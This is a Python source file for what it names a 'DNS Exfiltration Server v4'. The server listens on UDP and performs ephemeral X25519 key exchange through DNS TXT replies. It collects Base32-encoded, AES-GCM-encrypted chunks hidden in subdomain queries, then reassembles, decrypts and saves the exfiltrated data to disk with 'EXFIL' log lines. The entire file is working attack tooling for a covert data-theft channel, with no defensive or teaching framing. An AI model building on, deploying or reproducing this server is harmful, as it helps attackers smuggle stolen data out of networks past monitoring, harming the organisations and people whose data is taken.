#!/usr/bin/env python3
"""
Module Name: server.py

Description:
    DNS exfiltration server with per-session ephemeral ECDH key exchange,
    AES-GCM decryption, and Base32 decoding.

    - Generates a fresh X25519 keypair for each client session (true PFS).
    - Returns the server's ephemeral public key as a TXT record response.
    - Derives per-session AES key via ECDH + HKDF (context-bound).
    - Collects Base32-encoded chunks, decodes, decrypts AES-GCM.
    - SessionManager encapsulates all session state with proper locking.

Author: John Burns
Date: 2025-05-02
Version: 4.0 (SessionManager, structured wire format, no HMAC layer)
"""

import argparse
import json
import logging
from datetime import datetime, timezone
import os
import socket
import threading
import time
from collections import defaultdict

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import x25519
from dnslib import DNSRecord, RR, QTYPE, A, TXT

from crypto_utils import (
    load_signing_key, load_identity_pubkey, compute_fingerprint,
    derive_shared_keys, decrypt_blob, base32_encode, base32_decode,
    encode_kex_payload, decode_kex_payload, configure_logging,
)

logger = logging.getLogger('server')


# === Session Manager ===

class SessionManager:
    """Encapsulates all per-session state with thread-safe access."""

    def __init__(self, session_ttl=600, cleanup_interval=60,
                 rate_limit_window=60, rate_limit_max_ip=200,
                 rate_limit_max_session=100, require_auth=False):
        self.session_ttl = session_ttl
        self.cleanup_interval = cleanup_interval
        self.rate_limit_window = rate_limit_window
        self.rate_limit_max_ip = rate_limit_max_ip
        self.rate_limit_max_session = rate_limit_max_session
        self.require_auth = require_auth

        # Session state (protected by _lock)
        self._lock = threading.Lock()
        self._fragments = defaultdict(dict)
        self._fragment_totals = {}
        self._last_seen = {}
        self._aes_keys = {}
        self._server_pub_cache = {}
        self._auth_status = {}
        self._client_fingerprints = {}

        # Rate limiting state (protected by _rate_lock)
        self._rate_lock = threading.Lock()
        self._ip_timestamps = defaultdict(list)
        self._session_timestamps = defaultdict(list)

    def is_rate_limited(self, ip, session_id=None):
        """Check both IP-level and optional session-level rate limits."""
        now = time.time()
        with self._rate_lock:
            # IP rate limit
            ts = self._ip_timestamps[ip]
            self._ip_timestamps[ip] = [t for t in ts if now - t < self.rate_limit_window]
            if len(self._ip_timestamps[ip]) >= self.rate_limit_max_ip:
                return True
            self._ip_timestamps[ip].append(now)

            # Session rate limit
            if session_id:
                sts = self._session_timestamps[session_id]
                self._session_timestamps[session_id] = [t for t in sts if now - t < self.rate_limit_window]
                if len(self._session_timestamps[session_id]) >= self.rate_limit_max_session:
                    return True
                self._session_timestamps[session_id].append(now)

        return False

    def has_session(self, session_id):
        with self._lock:
            return session_id in self._aes_keys

    def store_session(self, session_id, aes_key, response_bytes, auth_status, client_fingerprint=None):
        with self._lock:
            if session_id in self._aes_keys:
                return  # Already stored by another thread
            self._aes_keys[session_id] = aes_key
            self._server_pub_cache[session_id] = response_bytes
            self._auth_status[session_id] = auth_status
            self._client_fingerprints[session_id] = client_fingerprint
            self._last_seen[session_id] = time.time()

    def get_cached_response(self, session_id):
        with self._lock:
            return self._server_pub_cache.get(session_id)

    def get_aes_key(self, session_id):
        with self._lock:
            return self._aes_keys.get(session_id)

    def get_auth_status(self, session_id):
        with self._lock:
            return self._auth_status.get(session_id, "UNAUTHENTICATED")

    def get_client_fingerprint(self, session_id):
        with self._lock:
            return self._client_fingerprints.get(session_id)

    def store_fragment(self, session_id, index, total, payload):
        """
        Store a fragment. Rejects duplicate indices (replay protection)
        and validates index is in range [0, total).
        Returns fragment count on success, or -1 on rejection.
        """
        if index < 0 or index >= total:
            logger.warning(f"[{session_id}] Invalid fragment index {index} (total={total})")
            return -1

        with self._lock:
            # Check for existing total mismatch
            if session_id in self._fragment_totals:
                if self._fragment_totals[session_id] != total:
                    logger.warning(f"[{session_id}] Fragment total mismatch: expected {self._fragment_totals[session_id]}, got {total}")
                    return -1
            else:
                self._fragment_totals[session_id] = total

            # Reject duplicate index (replay protection)
            if index in self._fragments[session_id]:
                logger.warning(f"[{session_id}] Duplicate fragment index {index} rejected (replay protection)")
                return -1

            self._fragments[session_id][index] = payload
            self._last_seen[session_id] = time.time()
            return len(self._fragments[session_id])

    def assemble_fragments(self, session_id):
        """Assemble all fragments into a single Base32 string."""
        with self._lock:
            frags = self._fragments.get(session_id, {})
            return ''.join(frags[i] for i in sorted(frags))

    def cleanup_stale(self):
        """Periodically remove sessions idle longer than TTL."""
        while True:
            now = time.time()
            with self._lock:
                stale = [sid for sid, ts in self._last_seen.items() if now - ts > self.session_ttl]
                for sid in stale:
                    self._fragments.pop(sid, None)
                    self._fragment_totals.pop(sid, None)
                    self._aes_keys.pop(sid, None)
                    self._server_pub_cache.pop(sid, None)
                    self._auth_status.pop(sid, None)
                    self._last_seen.pop(sid, None)
                    logger.info(f"[{sid}] Session expired and cleaned up")
            with self._rate_lock:
                # Clean up session rate limit entries for stale sessions
                for sid in stale:
                    self._session_timestamps.pop(sid, None)
            time.sleep(self.cleanup_interval)


# === Authentication Utilities ===

def load_trusted_clients(directory):
    """Load all .pub files from directory, index by fingerprint bytes."""
    trusted = {}
    if not os.path.isdir(directory):
        logger.warning(f"Trusted clients directory not found: {directory}")
        return trusted
    for fname in os.listdir(directory):
        if not fname.endswith('.pub'):
            continue
        path = os.path.join(directory, fname)
        try:
            pub_key = load_identity_pubkey(path)
            fp = compute_fingerprint(pub_key)
            trusted[fp] = pub_key
            logger.info(f"Loaded trusted client key: {fname} (fingerprint={fp.hex()})")
        except Exception as e:
            logger.warning(f"Failed to load {path}: {e}")
    return trusted


class TrustedClientStore:
    """Periodically reloads trusted client keys from a directory."""

    def __init__(self, directory, reload_interval=30):
        self._directory = directory
        self._reload_interval = reload_interval
        self._lock = threading.Lock()
        self._clients = load_trusted_clients(directory)
        self._reload_thread = threading.Thread(target=self._reload_loop, daemon=True)
        self._reload_thread.start()

    def _reload_loop(self):
        while True:
            time.sleep(self._reload_interval)
            try:
                new_clients = load_trusted_clients(self._directory)
                with self._lock:
                    self._clients = new_clients
                logger.debug(f"Reloaded {len(new_clients)} trusted client key(s)")
            except Exception as e:
                logger.warning(f"Failed to reload trusted clients: {e}")

    def get(self, fingerprint):
        with self._lock:
            return self._clients.get(fingerprint)

    def __contains__(self, fingerprint):
        with self._lock:
            return fingerprint in self._clients

    def __bool__(self):
        with self._lock:
            return bool(self._clients)

    def __len__(self):
        with self._lock:
            return len(self._clients)


# === DNS Helpers ===

def send_dns_response(data, addr, sock):
    """Send a minimal DNS A response (192.0.2.1) for given request."""
    req = DNSRecord.parse(data)
    reply = req.reply()
    reply.add_answer(RR(req.q.qname, QTYPE.A, rdata=A('192.0.2.1'), ttl=60))
    sock.sendto(reply.pack(), addr)


# === Main Request Logic ===

def handle_key_exchange(identifier, payload, manager, signing_key, trusted_clients):
    """
    Generate an ephemeral server keypair for this session, derive shared key,
    and return the server's ephemeral public key bytes (optionally signed).

    Uses v4 structured wire format (version + length-prefixed fields).
    Idempotent: if session already has keys, returns cached response.
    """
    cached = manager.get_cached_response(identifier)
    if cached is not None:
        return cached

    # Decode client payload from Base32
    b32 = payload.replace('.', '')
    decoded = base32_decode(b32)

    # Parse structured wire format
    try:
        version, fields = decode_kex_payload(decoded)
    except ValueError as e:
        logger.error(f"[{identifier}] Invalid KEX payload: {e}")
        return None

    client_authenticated = False

    if len(fields) == 3:
        # Authenticated: [pubkey, signature, fingerprint]
        client_pub_bytes = fields[0]
        client_sig = fields[1]
        client_fp = fields[2]

        if trusted_clients:
            client_identity_key = trusted_clients.get(client_fp)
            if client_identity_key is not None:
                try:
                    client_identity_key.verify(client_sig, client_pub_bytes)
                    client_authenticated = True
                    logger.info(f"[{identifier}] Client identity VERIFIED — TRUSTED (fingerprint={client_fp.hex()})")
                except Exception:
                    logger.warning(f"[{identifier}] Client signature verification FAILED (fingerprint={client_fp.hex()}) — UNAUTHENTICATED")
            else:
                logger.warning(f"[{identifier}] Unknown client fingerprint {client_fp.hex()} — UNAUTHENTICATED")

    elif len(fields) == 1:
        # Unauthenticated: [pubkey]
        client_pub_bytes = fields[0]

        if manager.require_auth:
            logger.warning(f"[{identifier}] Unauthenticated client rejected (--require-auth enabled)")
            return encode_kex_payload([])  # 0 fields = rejection
        logger.info(f"[{identifier}] Unauthenticated key exchange (no client signature)")

    else:
        logger.error(f"[{identifier}] Invalid KEX field count: {len(fields)}")
        return None

    # Generate ephemeral server keypair
    server_priv = x25519.X25519PrivateKey.generate()
    server_pub_bytes = server_priv.public_key().public_bytes(
        encoding=serialization.Encoding.Raw,
        format=serialization.PublicFormat.Raw
    )

    # Build response with structured wire format
    if signing_key and len(fields) == 3:
        server_sig = signing_key.sign(server_pub_bytes)
        response_payload = encode_kex_payload([server_pub_bytes, server_sig])
    else:
        response_payload = encode_kex_payload([server_pub_bytes])

    # Derive shared key (context-bound HKDF)
    aes_key = derive_shared_keys(
        server_priv, client_pub_bytes, identifier,
        server_pub_bytes, client_pub_bytes
    )

    auth_status = "TRUSTED" if client_authenticated else "UNAUTHENTICATED"
    fingerprint = client_fp.hex() if client_authenticated and len(fields) == 3 else None
    manager.store_session(identifier, aes_key, response_payload, auth_status, fingerprint)

    logger.info(f"[{identifier}] Ephemeral session keys established (auth={auth_status})")
    return response_payload


def handle_data_chunk(identifier, index, total, payload, manager, args):
    """
    Store payload chunk, and when all received, assemble and process.
    """
    count = manager.store_fragment(identifier, int(index), int(total), payload)
    if count == -1:
        return  # Rejected (duplicate or invalid)

    if count == int(total):
        b32_str = manager.assemble_fragments(identifier)
        try:
            raw = base32_decode(b32_str)
        except Exception as e:
            logger.error(f"[{identifier}] Base32 decode failed: {e}")
            return

        aes_key = manager.get_aes_key(identifier)
        if aes_key is None:
            logger.error(f"[{identifier}] No AES key found for session")
            return

        try:
            plaintext = decrypt_blob(aes_key, raw)
            logger.info(f"[{identifier}] Decryption succeeded, length={len(plaintext)} bytes")
        except Exception as e:
            logger.error(f"[{identifier}] AES-GCM decrypt failed: {e}")
            return

        auth_status = manager.get_auth_status(identifier)
        client_fingerprint = manager.get_client_fingerprint(identifier)

        out_dir = args.output_dir
        os.makedirs(out_dir, exist_ok=True)
        file_path = os.path.join(out_dir, f"{identifier}.bin")
        with open(file_path, 'wb') as f:
            f.write(plaintext)

        meta_path = os.path.join(out_dir, f"{identifier}.bin.meta")
        meta = {
            "auth_status": auth_status,
            "client_fingerprint": client_fingerprint,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
        with open(meta_path, 'w') as f:
            json.dump(meta, f)

        logger.info(
            f"EXFIL session_id={identifier} chunks={total} "
            f"plaintext_bytes={len(plaintext)} auth={auth_status} output={file_path}"
        )


def handle_request(data, addr, sock, args, manager, signing_key, trusted_clients):
    """
    Main DNS packet handler: routes key exchange (TXT) and data chunks (A).
    """
    client_ip = addr[0]

    req = DNSRecord.parse(data)
    qname = str(req.q.qname).rstrip('.')
    qtype = req.q.qtype

    if not qname.endswith(args.domain):
        return

    # Parse subdomain: <id>-<idx>-<total>-<payload>.<domain>
    prefix = qname[:-(len(args.domain) + 1)]
    parts = prefix.split('-', 3)
    if len(parts) != 4:
        return

    identifier, index, total, payload = parts

    # Rate limit check with session context
    session_id = identifier if index != '0' or total != '0' else None
    if manager.is_rate_limited(client_ip, session_id):
        logger.warning(f"Rate limit exceeded for {client_ip} (session={identifier}), dropping request")
        return

    if index == '0' and total == '0':
        # Key exchange
        response_payload = handle_key_exchange(identifier, payload, manager, signing_key, trusted_clients)
        if response_payload is None:
            return

        # Check if this is a rejection (0 fields)
        try:
            _, resp_fields = decode_kex_payload(response_payload)
            is_rejection = len(resp_fields) == 0
        except ValueError:
            is_rejection = False

        server_pub_b32 = base32_encode(response_payload)
        reply = req.reply()
        reply.add_answer(
            RR(req.q.qname, QTYPE.TXT, rdata=TXT(server_pub_b32), ttl=0)
        )
        sock.sendto(reply.pack(), addr)

        if is_rejection:
            logger.info(f"[{identifier}] Sent rejection response to unauthenticated client")
    else:
        # Data chunks
        handle_data_chunk(identifier, index, total, payload, manager, args)
        send_dns_response(data, addr, sock)


def start_server(args, signing_key, trusted_clients):
    """
    Initialize server and begin listening.
    """
    manager = SessionManager(
        session_ttl=args.session_ttl,
        cleanup_interval=args.cleanup_interval,
        rate_limit_window=args.rate_limit_window,
        rate_limit_max_ip=args.rate_limit_max,
        rate_limit_max_session=args.rate_limit_max_session,
        require_auth=args.require_auth,
    )

    cleanup_thread = threading.Thread(target=manager.cleanup_stale, daemon=True)
    cleanup_thread.start()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('', args.port))
    sock.settimeout(1)
    logger.info(f"Listening on UDP/{args.port}...")
    if args.require_auth:
        logger.info("Require-auth mode ENABLED — unauthenticated clients will be rejected")

    try:
        while True:
            try:
                data, addr = sock.recvfrom(4096)
                threading.Thread(
                    target=handle_request,
                    args=(data, addr, sock, args, manager, signing_key, trusted_clients),
                    daemon=True
                ).start()
            except socket.timeout:
                continue
    except KeyboardInterrupt:
        logger.info("Shutting down server")
    finally:
        sock.close()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="DNS Exfiltration Server v4 (Ephemeral ECDH + AES-GCM)")
    parser.add_argument('--port', type=int, default=5300)
    parser.add_argument('--output-dir', default='output')
    parser.add_argument('--domain', default='xf.example.com')
    parser.add_argument('--rate-limit-window', type=int, default=60,
                        help='Rate limit window in seconds (default: 60)')
    parser.add_argument('--rate-limit-max', type=int, default=200,
                        help='Max requests per IP per window (default: 200)')
    parser.add_argument('--rate-limit-max-session', type=int, default=100,
                        help='Max requests per session per window (default: 100)')
    parser.add_argument('--signing-key', default=None,
                        help='Path to server Ed25519 private key for authentication')
    parser.add_argument('--trusted-clients-dir', default=None,
                        help='Directory containing trusted client .pub files')
    parser.add_argument('--require-auth', action='store_true',
                        help='Reject unauthenticated clients')
    parser.add_argument('--session-ttl', type=int, default=600,
                        help='Session TTL in seconds (default: 600)')
    parser.add_argument('--cleanup-interval', type=int, default=60,
                        help='Cleanup interval in seconds (default: 60)')
    parser.add_argument('--json-log', action='store_true',
                        help='Output logs in JSON format')
    args = parser.parse_args()

    configure_logging(json_log=args.json_log)

    signing_key = None
    trusted_clients = {}

    if args.signing_key:
        signing_key = load_signing_key(args.signing_key)
        logger.info(f"Loaded server signing key from {args.signing_key}")
    if args.trusted_clients_dir:
        trusted_clients = TrustedClientStore(args.trusted_clients_dir)
        logger.info(f"Loaded {len(trusted_clients)} trusted client key(s) (auto-reload enabled)")

    start_server(args, signing_key, trusted_clients)
